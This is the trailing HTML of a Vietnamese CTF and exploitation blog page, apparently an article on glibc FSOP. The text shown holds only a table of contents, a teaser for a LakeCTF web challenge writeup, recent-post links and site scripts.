2025-12-01</div><div class="info-item-2">Writeup: LakeCTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Challenge: Gamblecore Dạng challenge này tác giả thiết kế mang thiên hướng RNG + bug (RNG: Random Number Generator) nên sẽ mang tính may rủi rất cao đúng như tên gọi của challenge:&gt; Phân tích qua file server.js, file xử lý chính của challenge:  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990app.get(&#x27;/api/balance&#x27;, (req, res) =&gt; &#123;    res.json(&#...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">H00d1eBl4ck</div><div class="author-info-description">Thuan Le</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElliotBigFan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElliotBigFan" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I'm trying to be better</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Khai-niem-ve-FILE-struct"><span class="toc-number">1.</span> <span class="toc-text">Khái niệm về FILE struct</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cau-truc-cua-FILE-trong-glibc"><span class="toc-number">1.1.</span> <span class="toc-text">Cấu trúc của FILE trong glibc:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Khai-niem-ve-FSOP"><span class="toc-number">2.</span> <span class="toc-text">Khái niệm về FSOP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ky-thuat-tan-cong-FSOP"><span class="toc-number">3.</span> <span class="toc-text">Kỹ thuật tấn công FSOP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#FSOP-glibc"><span class="toc-number">3.1.</span> <span class="toc-text">FSOP (glibc &lt;&#x3D; 2.23)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSOP-glibc-2-24"><span class="toc-number">3.2.</span> <span class="toc-text">FSOP (glibc &gt;&#x3D; 2.24)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-validate-vtable"><span class="toc-number">3.2.1.</span> <span class="toc-text">_IO_validate_vtable:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nhung-field-quan-trong-trong-struct-IO-FILE-va-IO-FILE-plus"><span class="toc-number">3.2.2.</span> <span class="toc-text">Những field quan trọng trong struct _IO_FILE và _IO_FILE_plus</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/14/Research/pwn/fsop/" title="File Stream Oriented Programming (FSOP)"><img src="/img/favicon_io/android-chrome-512x512.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="File Stream Oriented Programming (FSOP)"/></a><div class="content"><a class="title" href="/2026/01/14/Research/pwn/fsop/" title="File Stream Oriented Programming (FSOP)">File Stream Oriented Programming (FSOP)</a><time datetime="2026-01-14T02:31:32.000Z" title="Created 2026-01-14 09:31:32">2026-01-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/15/2025/ctf/seccon/wu/" title="Writeup: SECCON CTF 2025"><img src="/img/ctf/seccon/logo.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: SECCON CTF 2025"/></a><div class="content"><a class="title" href="/2025/12/15/2025/ctf/seccon/wu/" title="Writeup: SECCON CTF 2025">Writeup: SECCON CTF 2025</a><time datetime="2025-12-15T01:40:34.000Z" title="Created 2025-12-15 08:40:34">2025-12-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/08/2025/ctf/backdoorCTF/wu/" title="Writeup: BackdoorCTF 2025"><img src="/img/ctf/backdoor/logo.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: BackdoorCTF 2025"/></a><div class="content"><a class="title" href="/2025/12/08/2025/ctf/backdoorCTF/wu/" title="Writeup: BackdoorCTF 2025">Writeup: BackdoorCTF 2025</a><time datetime="2025-12-08T10:37:33.000Z" title="Created 2025-12-08 17:37:33">2025-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/01/2025/ctf/LakeCTF/wu/" title="Writeup: LakeCTF 2025"><img src="/img/ctf/lakectf/poster.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: LakeCTF 2025"/></a><div class="content"><a class="title" href="/2025/12/01/2025/ctf/LakeCTF/wu/" title="Writeup: LakeCTF 2025">Writeup: LakeCTF 2025</a><time datetime="2025-12-01T07:09:56.000Z" title="Created 2025-12-01 14:09:56">2025-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/11/2025/ctf/Infobahn/wu/" title="Writeup: Infobahn 2025"><img src="/img/ctf/infobahn/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: Infobahn 2025"/></a><div class="content"><a class="title" href="/2025/11/11/2025/ctf/Infobahn/wu/" title="Writeup: Infobahn 2025">Writeup: Infobahn 2025</a><time datetime="2025-11-11T03:31:26.000Z" title="Created 2025-11-11 10:31:26">2025-11-11</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/favicon_io/android-chrome-512x512.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By H00d1eBl4ck</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="1" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>